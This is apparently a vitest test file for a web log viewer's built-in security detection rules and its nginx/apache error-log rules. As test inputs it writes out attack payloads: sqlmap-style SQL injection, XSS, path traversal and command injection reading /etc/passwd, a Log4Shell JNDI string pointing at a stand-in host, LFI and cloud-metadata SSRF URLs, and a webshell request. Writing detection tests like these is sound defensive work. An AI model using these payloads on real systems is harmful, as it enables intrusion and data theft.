import { describe, expect, it } from "vitest";
import { BOOKMARK_RULE, BUILTIN_ERROR_RULES, BUILTIN_RULES, describeFilter, ruleFilter, ruleFromView, rulesFor } from "./rules";
import { emptyFilter, type FilterExpr, type LogKind, type SavedView } from "../types";

/** 조건식을 JS로 평가해 서명이 의도한 값을 잡는지 본다(엔진 SQL과 같은 의미). */
function evalExpr(e: FilterExpr, row: Record<string, string | number | null>): boolean {
  switch (e.kind) {
    case "true":
      return true;
    case "and":
      return e.items.every((i) => evalExpr(i, row));
    case "or":
      return e.items.some((i) => evalExpr(i, row));
    case "not":
      return !evalExpr(e.item, row);
    case "cond": {
      const v = row[e.field];
      if (e.op === "is_null") return v === null || v === undefined;
      if (v === null || v === undefined) return false;
      const s = String(v);
      const n = Number(v);
      switch (e.op) {
        case "eq":
          return s === e.value;
        case "ne":
          return s !== e.value;
        case "gt":
          return n > Number(e.value);
        case "gte":
          return n >= Number(e.value);
        case "lt":
          return n < Number(e.value);
        case "lte":
          return n <= Number(e.value);
        case "contains":
          return s.includes(e.value);
        case "icontains":
          return s.toLowerCase().includes(e.value.toLowerCase());
        case "starts_with":
          return s.startsWith(e.value);
        case "ends_with":
          return s.endsWith(e.value);
        case "regex":
          return new RegExp(e.value.replace(/^\(\?i\)/, ""), e.value.startsWith("(?i)") ? "i" : "").test(s);
      }
    }
  }
}
const byId = (id: string) => BUILTIN_RULES.find((r) => r.id === `builtin:${id}`)!;
const req = (request_target: string, status = 200, user_agent: string | null = "Mozilla/5.0") => ({ request_target, status, user_agent, client_ip: "1.1.1.1", method: "GET", bytes_sent: 10, protocol: "HTTP/1.1", referrer: null });

describe("builtin rules", () => {
  it("compile and carry names", () => {
    expect(BUILTIN_RULES.length).toBeGreaterThanOrEqual(15);
    expect(BUILTIN_RULES[0]).toMatchObject({ id: "builtin:bookmarks", builtin: true });
    expect(ruleFilter(BUILTIN_RULES[0], { active_only: true })).toMatchObject({ bookmarked_only: true, active_only: true });
    expect(BUILTIN_RULES[1]).toMatchObject({ id: "builtin:all_requests", name: "전체 요청", builtin: true });
    expect(ruleFilter(byId("ok_responses"), { active_only: true })).toMatchObject({
      active_only: true,
      expr: {
        kind: "and",
        items: [
          { kind: "cond", field: "status", op: "gte", value: "200" },
          { kind: "cond", field: "status", op: "lte", value: "299" },
        ],
      },
    });
  });

  it("signatures hit typical payloads and skip plain paths", () => {
    expect(evalExpr(byId("sql_injection").expr, req("/item?id=1%27%20UNION%20SELECT%201"))).toBe(true);
    expect(evalExpr(byId("sql_injection").expr, req("/item?id=1' or 1=1--"))).toBe(true);
    expect(evalExpr(byId("xss").expr, req("/s?q=<script>alert(1)</script>"))).toBe(true);
    expect(evalExpr(byId("path_traversal").expr, req("/../../etc/passwd"))).toBe(true);
    expect(evalExpr(byId("scanner_paths").expr, req("/wp-login.php"))).toBe(true);
    expect(evalExpr(byId("command_injection").expr, req("/ping?host=1.1.1.1;cat%20/etc/passwd"))).toBe(true);
    expect(evalExpr(byId("sql_injection_success").expr, req("/x?id=%27", 200))).toBe(true);
    expect(evalExpr(byId("sql_injection_success").expr, req("/x?id=%27", 404))).toBe(false);
    expect(evalExpr(byId("bots").expr, req("/", 200, "python-requests/2.31"))).toBe(true);
    expect(evalExpr(byId("bots").expr, req("/", 200, null))).toBe(true);
    const sqlmap = byId("sqlmap").expr;
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%201234=1234"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1' AND 7429=7429-- xKpq"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=-1%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x716b6a7671,IFNULL(CAST(user()%20AS%20NCHAR),0x20),0x7176767a71)--%20-"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%20EXTRACTVALUE(1234,CONCAT(0x5c,0x716b6a7671))"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1%20AND%20(SELECT%201234%20FROM%20(SELECT(SLEEP(5)))x)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1;WAITFOR%20DELAY%20'0:0:5'--"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item?id=1||CHR(113)||CHR(122)||CHR(118)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/", 200, "sqlmap/1.7.2#stable (https://sqlmap.org)"))).toBe(true);
    expect(evalExpr(sqlmap, req("/item.php?id=1234&page=5678"))).toBe(false);
    expect(evalExpr(sqlmap, req("/search?q=and%20then%20some"))).toBe(false);
    expect(evalExpr(byId("log4shell").expr, req("/?x=${jndi:ldap://evil/a}"))).toBe(true);
    expect(evalExpr(byId("log4shell").expr, req("/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D"))).toBe(true);
    expect(evalExpr(byId("lfi_ssrf").expr, req("/page?file=php://filter/convert.base64-encode/resource=index"))).toBe(true);
    expect(evalExpr(byId("lfi_ssrf").expr, req("/fetch?url=http://169.254.169.254/latest/meta-data/"))).toBe(true);
    expect(evalExpr(byId("webshell_upload").expr, req("/uploads/2026/shell.php?cmd=id"))).toBe(true);
    expect(evalExpr(byId("scanner_tools").expr, req("/", 200, "Mozilla/5.0 (Nikto/2.1.6)"))).toBe(true);
    for (const r of BUILTIN_RULES.filter((x) => !["bookmarks", "all_requests", "ok_responses"].some((id) => x.id === `builtin:${id}`))) {
      expect(evalExpr(r.expr, req("/index.html")), r.id).toBe(false);
      expect(evalExpr(r.expr, req("/api/users/42?page=2&sort=name")), r.id).toBe(false);
    }
  });
});

describe("ruleFromView", () => {
  it("re-parses stored source and falls back for legacy views", () => {
    const src = 'rule mine { meta: description = "설명" condition: status == 404 }';
    const r = ruleFromView({ view_id: 7, name: "내 룰", definition: { filter: { ...emptyFilter(), status: 404 }, sort: "time_desc", columns: [], rule_source: src } });
    expect(r).toMatchObject({ id: "view:7", builtin: false, viewId: 7, name: "내 룰", description: "설명", source: src });
    expect(ruleFilter(r).expr).toEqual({ kind: "cond", field: "status", op: "eq", value: "404" });

    const broken = ruleFromView({ view_id: 8, name: "깨짐", definition: { filter: { ...emptyFilter(), status: 500 }, sort: "time_desc", columns: [], rule_source: "rule x { condition: nope }" } });
    expect(broken.error).toBeTruthy();
    expect(ruleFilter(broken).status).toBe(500);

    const legacy = ruleFromView({ view_id: 9, name: "옛 뷰", definition: { filter: { ...emptyFilter(), status: 404, target_contains: "/admin" }, sort: "time_desc", columns: [], rule_source: null } });
    expect(legacy.description).toBe('상태 404 · 경로에 "/admin" 포함');
    expect(describeFilter(emptyFilter())).toBe("조건 없음");
  });
});

/** 조건식이 건드리는 컬럼 목록. 에러 룰이 접근 로그 컬럼을 보지 않는지 확인할 때 쓴다. */
function fieldsOf(e: FilterExpr): string[] {
  switch (e.kind) {
    case "cond":
      return [e.field];
    case "and":
    case "or":
      return e.items.flatMap(fieldsOf);
    case "not":
      return fieldsOf(e.item);
    case "true":
      return [];
  }
}

const errById = (id: string) => BUILTIN_ERROR_RULES.find((r) => r.id === `builtin:${id}`)!;
const err = (level: string, message: string, client_ip: string | null = "10.0.0.9") => ({ level, message, client_ip });

describe("builtin error rules", () => {
  it("compile and share the bookmark rule", () => {
    expect(BUILTIN_ERROR_RULES[0]).toBe(BOOKMARK_RULE);
    expect(BUILTIN_ERROR_RULES[1]).toMatchObject({ id: "builtin:all_errors", name: "전체 에러", builtin: true });
    expect(BUILTIN_ERROR_RULES.length).toBeGreaterThanOrEqual(9);
    // 접근 룰과 아이디가 겹치면 사이드바 선택이 섞인다.
    const accessIds = new Set(BUILTIN_RULES.slice(1).map((r) => r.id));
    for (const r of BUILTIN_ERROR_RULES.slice(1)) expect(accessIds.has(r.id), r.id).toBe(false);
  });

  it("only look at error columns; bare signatures go to the message", () => {
    for (const r of BUILTIN_ERROR_RULES.slice(1)) {
      for (const f of fieldsOf(r.expr)) expect(["level", "message"], r.id).toContain(f);
    }
    expect(fieldsOf(errById("file_missing").expr)).toEqual(["message", "message", "message"]);
  });

  it("hit real nginx and apache error lines", () => {
    expect(evalExpr(errById("severe_levels").expr, err("crit", "accept4() failed (24: Too many open files)"))).toBe(true);
    expect(evalExpr(errById("severe_levels").expr, err("core:emerg", "AH00020: Configuration Failed, exiting"))).toBe(true);
    expect(evalExpr(errById("severe_levels").expr, err("error", "no such file"))).toBe(false);
    expect(evalExpr(errById("error_level").expr, err("error", "x"))).toBe(true);
    expect(evalExpr(errById("error_level").expr, err("core:error", "x"))).toBe(true);
    expect(evalExpr(errById("error_level").expr, err("warn", "x"))).toBe(false);
    expect(evalExpr(errById("warn_level").expr, err("php:warn", "x"))).toBe(true);
    expect(evalExpr(errById("warn_level").expr, err("notice", "x"))).toBe(false);
    expect(evalExpr(errById("file_missing").expr, err("error", 'open() "/var/www/html/favicon.ico" failed (2: No such file or directory)'))).toBe(true);
    expect(evalExpr(errById("file_missing").expr, err("core:error", "AH00035: File does not exist: /var/www/html/robots.txt"))).toBe(true);
    expect(evalExpr(errById("permission_denied").expr, err("error", 'open() "/var/log/app.log" failed (13: Permission denied)'))).toBe(true);
    expect(evalExpr(errById("permission_denied").expr, err("core:error", "AH01630: client denied by server configuration: /var/www/.env"))).toBe(true);
    expect(evalExpr(errById("upstream_failed").expr, err("error", "connect() failed (111: Connection refused) while connecting to upstream"))).toBe(true);
    expect(evalExpr(errById("upstream_failed").expr, err("error", "upstream timed out (110: Connection timed out) while reading response header from upstream"))).toBe(true);
    expect(evalExpr(errById("upstream_failed").expr, err("error", "no live upstreams while connecting to upstream"))).toBe(true);
    expect(evalExpr(errById("upstream_failed").expr, err("error", "upstream prematurely closed connection while reading response header from upstream"))).toBe(true);
    expect(evalExpr(errById("body_too_large").expr, err("error", "client intended to send too large body: 20971520 bytes"))).toBe(true);
    expect(evalExpr(errById("body_too_large").expr, err("error", "Request Entity Too Large"))).toBe(true);
    expect(evalExpr(errById("ssl_handshake").expr, err("error", "SSL_do_handshake() failed (SSL: error:0A000418:SSL routines::tlsv1 alert unknown ca)"))).toBe(true);
    expect(evalExpr(errById("ssl_handshake").expr, err("info", "SSL handshake error"))).toBe(true);
    expect(evalExpr(errById("php_fastcgi").expr, err("error", 'FastCGI sent in stderr: "PHP message: PHP Fatal error: Uncaught Error" while reading response header'))).toBe(true);
    expect(evalExpr(errById("upstream_failed").expr, err("error", "upstream sent too big header while reading response header from upstream"))).toBe(true);
    expect(evalExpr(errById("php_fastcgi").expr, err("error", "upstream sent too big header while reading response header from upstream"))).toBe(false);
    expect(evalExpr(errById("directory_index_forbidden").expr, err("error", 'directory index of "/var/www/html/files/" is forbidden'))).toBe(true);
    expect(evalExpr(errById("directory_index_forbidden").expr, err("core:error", "AH01276: Directory index forbidden by Options directive: /var/www/html/files/"))).toBe(true);
  });

  it("skip ordinary error lines", () => {
    const plain = err("notice", "signal process started");
    for (const r of BUILTIN_ERROR_RULES.slice(2)) expect(evalExpr(r.expr, plain), r.id).toBe(false);
    expect(evalExpr(errById("all_errors").expr, plain)).toBe(true);
  });
});

describe("rulesFor", () => {
  const view = (view_id: number, name: string, log_kind: LogKind | null, rule_source: string | null = null): SavedView => ({
    view_id,
    name,
    definition: { filter: { ...emptyFilter(), log_kind, expr: { kind: "cond", field: "status", op: "eq", value: "500" } }, sort: "time_asc", columns: [], rule_source },
  });

  it("keeps each kind's user rules apart and defaults old views to access", () => {
    const views = [view(1, "접근 내 룰", "access"), view(2, "에러 내 룰", "error"), view(3, "옛 뷰", null)];
    const access = rulesFor("access", views);
    expect(access.slice(0, BUILTIN_RULES.length)).toEqual(BUILTIN_RULES);
    expect(access.filter((r) => !r.builtin).map((r) => r.name)).toEqual(["접근 내 룰", "옛 뷰"]);
    const error = rulesFor("error", views);
    expect(error.slice(0, BUILTIN_ERROR_RULES.length)).toEqual(BUILTIN_ERROR_RULES);
    expect(error.filter((r) => !r.builtin).map((r) => r.name)).toEqual(["에러 내 룰"]);
  });

  it("compiles a user error rule's bare signature against the message", () => {
    const src = 'rule mine { strings: $a = "Connection refused" condition: $a }';
    const mine = rulesFor("error", [view(5, "내 에러 룰", "error", src)]).filter((r) => !r.builtin);
    expect(mine[0].expr).toEqual({ kind: "cond", field: "message", op: "contains", value: "Connection refused" });
    const access = rulesFor("access", [view(6, "내 접근 룰", "access", src)]).filter((r) => !r.builtin);
    expect(access[0].expr).toEqual({ kind: "cond", field: "request_target", op: "contains", value: "Connection refused" });
  });
});
